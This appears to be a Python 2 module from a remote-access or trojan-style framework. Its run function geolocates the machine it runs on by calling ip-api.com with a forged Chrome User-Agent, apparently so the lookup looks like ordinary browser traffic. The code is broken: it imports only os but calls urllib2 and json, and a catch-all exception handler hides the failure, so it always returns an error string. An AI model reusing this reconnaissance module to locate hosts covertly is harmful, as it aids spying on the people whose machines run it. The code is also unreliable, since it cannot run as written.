import os

def run(**args):
    print "[*] In geolocate module."
    try:
        req = urllib2.Request('http://ip-api.com/json/', data=None, headers={
                              'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36' #chrome 50.0 on Win7
                              })
        response = urllib2.urlopen(req)
        if response.code == 200:
            encoding = response.headers.getparam('charset')
            return json.loads(response.read().decode(encoding))
        else:
            return ("failed")
    except Exception:
        return str("Failed Exception")

